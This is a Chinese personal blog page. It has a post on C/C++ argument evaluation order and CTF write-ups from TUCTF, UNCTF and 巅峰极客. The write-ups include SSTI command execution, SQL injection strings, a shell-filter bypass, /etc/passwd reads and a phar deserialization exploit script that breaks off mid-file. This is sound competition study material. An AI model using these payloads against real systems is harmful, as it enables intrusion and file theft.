<pre><code class="c++">#include&lt;stdio.h&gt;
int i=0;
int update(){i++;return i;}
int main()
{
    printf(&quot;update():%d i:%d\n&quot;,update(),i);
    return 0;
}</code></pre>
<p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include &lt;queue&gt;
#include&lt;stdio.h&gt; 
using namespace std;
int i=0;
int update(){i++;return i;};
int main()
{
    printf(&quot;----------------------------test printf----------------------------\n&quot;);
    printf(&quot;before:%d\n&quot;,i);
    printf(&quot;update():%d i:%d\n&quot;,update(),i);
    printf(&quot;later:%d\n&quot;,i);

    printf(&quot;before:%d\n&quot;,i);
    printf(&quot;i:%d update():%d \n&quot;,i,update());
    printf(&quot;later:%d\n&quot;,i);

    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());
}</code></pre>
<p>它的输出结果是</p>
<pre><code>----------------------------test printf----------------------------
before:0
update():1 i:0
later:1
before:1
i:2 update():2
later:2
update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include &lt;queue&gt;
#include&lt;stdio.h&gt; 
using namespace std;
int i=0;
int update(){i++;return i;};
int main()
{

    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;
    i=0;
    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;

    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;
    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;

    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;

}</code></pre>
<p>它的输出结果是:</p>
<pre><code>---------------------------- test cout ----------------------------
before:0
update():1 i:0
later:1
before:1
i:2 update():2
later:2
update1:5 update2:4 update3:3
</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p>
<p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p>
<p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p>
<p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p>
<p>我们来看一下x64下这一条语句的汇编代码</p>
<pre><code>mov     ebx, cs:i
call    _Z6updatev      ; update(void)
mov     r8d, ebx
mov     edx, eax
lea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;
call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p>
<p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p>
<p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p>
<p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p>
<h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p>
<pre><code class="c++">#include &lt;stdio.h&gt;
int main()
{
    long long a = 1, b = 2, c = 3;
    printf(&quot;%d %d %d\n&quot;, a,b,c);
    return 0;
}</code></pre>
<p>求输出</p>
<p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/">http://blog.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" data-id="cka3ckr3o004mv4v064pqf7m7" data-title="由cout和printf来对函数传参过程的探讨" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/14/hello-world/" class="article-date">
  <time class="dt-published" datetime="2019-12-14T03:53:32.169Z" itemprop="datePublished">2019-12-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/14/hello-world/">hello-world</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/14/hello-world/">http://blog.ccreater.top/2019/12/14/hello-world/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/14/hello-world/" data-id="cka3ckr2y002jv4v09ns8gtne" data-title="hello-world" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-tuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/30/tuctf/" class="article-date">
  <time class="dt-published" datetime="2019-11-30T12:25:26.222Z" itemprop="datePublished">2019-11-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/30/tuctf/">tuctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a href="http://chal.tuctf.com:30006/0.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/0.html</a> </p>
<p> <a href="http://chal.tuctf.com:30006/1.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/1.html</a></p>
<p> <a href="http://chal.tuctf.com:30006/2.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/2.html</a>  </p>
<p><code>FIXME: need to use Page::includeStaticResource</code></p>
<p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p>
<p><a href="https://192.168.1.254/" target="_blank" rel="noopener">https://192.168.1.254/</a></p>
<p>….爆破密码获得flag</p>
<h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>当Referer不为<a href="http://chal.tuctf.com:30001/login.html时,存在sql注入" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.html时,存在sql注入</a></p>
<p>当Referer: <a href="http://chal.tuctf.com:30001/login.hmtl时sql" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.hmtl时sql</a> 注入被过滤</p>
<p>对第一种情况sql注入得到</p>
<pre><code class="python">#database:information_schema,challenge,mysql,performance_schema,sys 
#table:users
#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
#user,password,USER : dave,hunter2,dave</code></pre>
<p>利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入</p>
<ul>
<li>sql注入</li>
</ul>
<pre><code class="python">dave&#39;+or+1%23 x
dave&quot;+or+1%23 x
dave&quot;)+or+1%23 x
dave&#39;)+or+1%23 x
\转义&#39;或&quot;来逃逸失败

</code></pre>
<p>宽字节注入:</p>
<pre><code class="python">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x
#username=%2bsleep(10)&amp;password=%bf%5c&#39; x
#username=%bf%5c&quot;&amp;password=%2bsleep(10) x
#username=%bf%5c&#39;&amp;password=%2bsleep(10) x</code></pre>
<p>sql注入点时username还是password</p>
<p>是单引号还是双引号闭合</p>
<p>过滤了哪些字符，转义了哪些字符</p>
<p>We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p>
<p>Surprise, there really is a backup file there. Let’s see what is inside.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p>
<p>We found the flag, and it is <code>TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}</code></p>
<h3 id="The-Droid-You’re-Looking-For"><a href="#The-Droid-You’re-Looking-For" class="headerlink" title="The Droid You’re  Looking For"></a>The Droid You’re  Looking For</h3><p>看到droid想到robots.txt,直接访问提示没有权限</p>
<p>因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:</p>
<pre><code>Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</code></pre><p>robots.txt</p>
<pre><code>User-agent: *
Disallow: googleagentflagfoundhere.html</code></pre><p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p>
<h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><pre><code class="python">Traceback (most recent call last):
  File &quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;, line 1509, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File &quot;/usr/src/app/class_website.py&quot;, line 87, in post
    if len(name) == 0 or len(phone_num) == 0 or len(email) == 0 or len(passwd2) == 0 or passw != passw2:
NameError: global name &#39;passwd2&#39; is not defined</code></pre>
<p>在网页中发现</p>
<pre><code class="html">&lt;!-- TODO: add /welcome/test --&gt;</code></pre>
<p>打开只有welcome test &lt;==&gt; /welcome/test</p>
<p>猜测是ssti</p>
<pre><code>{{__import__('os').popen('cat flag.txt').read()}}</code></pre><p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p>
<h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>修改cookie获得登陆权限</p>
<p>sqlmap得到密码</p>
<p>file:///etc/passwd获得flag???</p>
<p>http访问都不行的呀</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/11/30/tuctf/">http://blog.ccreater.top/2019/11/30/tuctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/11/30/tuctf/" data-id="cka3ckr3e003tv4v01dj98cw7" data-title="tuctf2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-unctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/25/unctf2019/" class="article-date">
  <time class="dt-published" datetime="2019-10-25T07:53:35.701Z" itemprop="datePublished">2019-10-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/25/unctf2019/">unctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><pre><code class="php">
&lt;?php
    highlight_file(__FILE__);
    $a = $_GET[&#39;a&#39;];
    $b = $_GET[&#39;b&#39;];
 // try bypass it
    if (preg_match(&quot;/\&#39;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
        $a = &quot;&quot;;
        $a =&#39;&quot;&#39; . $a . &#39;&quot;&#39;;
    if (preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))
        $b = &quot;&quot;;
        $b = &#39;&quot;&#39; . $b . &#39;&quot;&#39;;
     $cmd = &quot;file $a $b&quot;;
      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); 
     system($cmd);
?&gt;</code></pre>
<p>用<code>a=\&amp;b=\</code>来逃脱引号</p>
<p>用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.</p>
<p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p>
<p>最后在<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>里找到flag</p>
<p><code>unctf{86dfe85d7c5842c5c04adae104193ee1}</code></p>
<h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>题目说是重置密码,刚开始我想的是越权</p>
<p>后面搞了好久都不行。后面试着弄了一下发现一个验证码可以多次用.</p>
<p>我就猜有可能是条件竞争</p>
<p>先注册一个账号用收到的验证码重置，然后再用admin账号请求重置密码</p>
<p>然后直接跳到修改密码的界面,修改一下就出来了</p>
<p> flag{175f3098f80735ddfdfbd4588f6b1082} </p>
<h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>盲猜sql注入</p>
<p>转义:<code>&#39;,&quot;,\,#</code></p>
<p>还给了我们一个phpinfo?????</p>
<p>我也想帮赵总征婚啊，可是我没机会</p>
<p>remember_me 是否可以注入?</p>
<h2 id="inject-twice"><a href="#inject-twice" class="headerlink" title="inject twice"></a>inject twice</h2><p>题目是sql-lab的源码</p>
<p>二次注入点</p>
<pre><code class="php">if (isset($_POST[&#39;submit&#39;]))
{


    # Validating the user input........
    $username= $_SESSION[&quot;username&quot;];
    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);
    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);
    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);

    if($pass==$re_pass)
    {    
        $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;
        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
        $row = mysql_affected_rows();
        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
        echo &#39;&lt;center&gt;&#39;;
        if($row==1)
        {
            echo &quot;Password successfully updated&quot;;

        }
        else
        {
            header(&#39;Location: failed.php&#39;);
            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;
        }
    }
    else
    {
        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;
        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;
        header(&#39;refresh:2, url=index.php&#39;);
    }
}
?&gt;</code></pre>
<p>但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。</p>
<p>黑名单:<code>or,</code></p>
<p>注册一个<code>hello\</code>的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了</p>
<p>//////////////???????????????????</p>
<p>currentpass=<code>/**/or/**/1-- a</code></p>
<p>数据库名<code>or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p>
<p>information_schema,metinfo,mysql,performance_schema,security,sys</p>
<p>表:</p>
<p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p>
<p>security:emails,fl4g,referers,uagents,users</p>
<p>列名</p>
<p>fl4g:f1ag</p>
<p>最后的flag<code>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</code></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>又是一个vue应用</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p>
<p>在代码中发现</p>
<p>/calc: 可以命令执行,但是却没有办法找到有效的利用方式</p>
<p>后端是node.js</p>
<p>version: v10.12.0 </p>
<p>cwd:/usr</p>
<p>/usr目录</p>
<p> bin,games,include,lib,local,sbin,share,src </p>
<p>res.end(require(‘fs’).readFileSync(‘/etc/passwd’).toString())</p>
<p>require(‘fs’).readdirSync.(‘/etc/passwd’).toString()</p>
<p>在根目录下找到flag</p>
<p>  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} </p>
<p>最后还是晚了一分钟</p>
<p>看来改天要看看nodejs的东东?</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/10/25/unctf2019/">http://blog.ccreater.top/2019/10/25/unctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/10/25/unctf2019/" data-id="cka3ckr3g003xv4v09okrdtih" data-title="unctf2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-巅峰极客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2019-10-19T06:52:22.957Z" itemprop="datePublished">2019-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:abcdefghij1@qq.com">abcdefghij1@qq.com</a></p>
<p>黑名单:union</p>
<p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p>
<p>最后payload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>已知文件:<code>file.php,download.php,index.php,upload_file.php</code></p>
<p>download.php</p>
<pre><code class="php">
$name = $_GET[&#39;name&#39;];
$url = $_SERVER[&#39;QUERY_STRING&#39;];
if (isset($name)){
    if (preg_match(&#39;/\.|etc|var|tmp|usr/i&#39;, $url)){
        echo(&quot;hacker!&quot;);
    }
    else{
        if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){
            echo (&quot;hacker!&quot;);
        }
        else{
            $name = safe_replace($name);
            if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){
                $filename = $name.&#39;.php&#39;;
                $dir =&quot;./&quot;;
                $down_host = $_SERVER[&#39;HTTP_HOST&#39;].&#39;/&#39;;
                if(file_exists(__DIR__.&#39;/&#39;.$dir.$filename)){
                    $file = fopen ( $dir.$filename, &quot;rb&quot; );
                    Header ( &quot;Content-type: application/octet-stream&quot; );
                    Header ( &quot;Accept-Ranges: bytes&quot; );
                    Header ( &quot;Accept-Length: &quot; . filesize ( $dir.$filename ) );
                    Header ( &quot;Content-Disposition: attachment; filename=&quot; . $filename );
                    echo fread ( $file, filesize ( $dir . $filename ) );
                    fclose ( $file );
                    exit ();
                }else{
                    echo (&quot;file doesn&#39;t exist.&quot;);
                }
            }
            if (preg_match(&#39;/flag/i&#39;, $name)){
                echo (&quot;hacker!&quot;);
            }
        }
    }
}</code></pre>
<p>file.php</p>
<pre><code class="php">&lt;?php 
header(&quot;content-type:text/html;charset=utf-8&quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;;
$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
if(empty($file)) { 
    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
}
if(preg_match(&#39;/http|https|file:|gopher|dict|\.\/|\.\.|flag/i&#39;,$file)) {
            die(&#39;hacker!&#39;); 
}elseif(!preg_match(&#39;/\//i&#39;,$file))
{
    die(&#39;hacker!&#39;);
}
$show = new Show(); 
if(file_exists($file)) { 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
} else if (!empty($file)){ 
    die(&#39;file doesn\&#39;t exists.&#39;); 
} 
?&gt;</code></pre>
<p>function.php</p>
<pre><code class="php">&lt;?php
//show_source(__FILE__); 
include &quot;base.php&quot;; 
header(&quot;Content-type: text/html;charset=utf-8&quot;); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;; 
    //mkdir(&quot;upload&quot;,0777); 
    if(file_exists(&quot;upload/&quot; . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
            return false; 
        } 
    } 
} 
?&gt; </code></pre>
<p>class.php</p>
<pre><code class="php">&lt;?php

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $text= $this-&gt;source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __toString()
    {
        $text= $this-&gt;source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __set($key,$value)
    {
        $this-&gt;$key = $value;
    }
    public function _show()
    {
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|flag/i&#39;,$this-&gt;source)) {
            die(&#39;hacker!&#39;);
        } else {
            highlight_file($this-&gt;source);
        }

    }
    public function __wakeup()
    {
        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker~&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}
class S6ow
{
    public $file;
    public $params;
    public function __construct()
    {
        $this-&gt;params = array();
    }
    public function __get($key)
    {
        return $this-&gt;params[$key];
    }
    public function __call($name, $arguments)
    {
        if($this-&gt;{$name})
            $this-&gt;{$this-&gt;{$name}}($arguments);
    }
    public function file_get($value)
    {
        echo $this-&gt;file;
    }
}

class Sh0w
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this-&gt;str = new Show(&#39;index.php&#39;);
        $this-&gt;str-&gt;source = $this-&gt;test;

    }
    public function __destruct()
    {
        $this-&gt;str-&gt;_show();
    }
}
?&gt;</code></pre>
<p>分析发现一堆类，且file_exists可以触发phar反序列化漏洞</p>
<p>pop链:</p>
<p><code>sh0w($str=new S6ow)-&gt;S6ow($file=new Show,$_show=&quot;file_get&quot;)-&gt;Show($source=&#39;/flag&#39;)</code></p>
<pre><code class="php">&lt;?php
class Show
{
    public $source;
    public $str;
    public function __construct()
    {
        $this-&gt;source=&quot;/flag&quot;;
        $this-&gt;str=&quot;&quot;;
        $text= $this-&gt;source;

    }
    public function __toString()
    {
        $text= $this-&gt;source;

    }

}
class S6ow
{
    public $file;
    public $params;
    public $_show;
    public function __construct()
    {
        $this-&gt;params = array();
        $this-&gt;file=new Show;
        $this-&gt;_show=&quot;file_get&quot;;

    }
    public function __get($key)
    {
        return $this-&gt;params[$key];
    }
    public function __call($name, $arguments)
    {
        $name=&quot;_show&quot;;
        print($name);
        print($this-&gt;{$name});
        if($this-&gt;{$name})
            $this-&gt;{$this-&gt;{$name}}($arguments);
            //$this-&gt;file_get($arguments);
            //$this-&gt;{$name}=&quot;file_get&quot;
            //$name=_show
            //$file=new Show;
    }
    public function file_get($value)
    {
    }
}

class Sh0w
{
    public $test;
    public $str;
    public function __construct()
    {
        $this-&gt;str =new S6ow;
        $this-&gt;test=&quot;&quot;;

    }
    public function __destruct()
    {
        $this-&gt;str-&gt;_show();
    }
}


$a=new Sh0w();

@unlink(&quot;hello.phar&quot;);
$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); 
